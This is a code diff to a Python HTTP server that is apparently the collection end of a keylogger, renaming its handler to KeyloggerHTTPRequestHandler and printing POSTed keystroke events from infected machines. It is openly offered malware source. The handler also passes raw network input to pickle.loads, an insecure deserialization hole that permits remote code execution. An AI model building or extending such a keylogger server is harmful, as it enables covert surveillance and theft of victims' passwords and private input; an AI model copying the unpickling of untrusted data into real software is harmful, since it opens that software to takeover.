@@ -1,7 +1,11 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer, HTTPStatus
+from logging import INFO, StreamHandler, getLogger
+from pickle import loads
+
+from .events import Event
 
 
-class Handler(BaseHTTPRequestHandler):
+class KeyloggerHTTPRequestHandler(BaseHTTPRequestHandler):
     def send_response(self, code, message=None):
         """Overrides super class method to get rid of the call to `log_request`.
         """
@@ -10,11 +14,20 @@ class Handler(BaseHTTPRequestHandler):
         self.send_header('Date', self.date_time_string())
 
     def do_POST(self):
-        print(self.rfile.read(int(self.headers.get('Content-Length'))))
-        self.send_response(HTTPStatus.IM_A_TEAPOT)
+        data = self.rfile.read(int(self.headers.get('Content-Length')))
+        if self.headers.get('data-format') == 'raw':
+            print(Event.from_raw(data))
+        else:
+            print(loads(data))
+        self.send_response(HTTPStatus.OK)
         self.end_headers()
 
 
 def server_loop(address: str, port: int):
-    server = HTTPServer((address, port), Handler)
-    server.serve_forever()
+    server = HTTPServer((address, port), KeyloggerHTTPRequestHandler)
+    print(f'Server listening on {address}:{port}')
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        print('Server shuting down!')
+        server.shutdown()
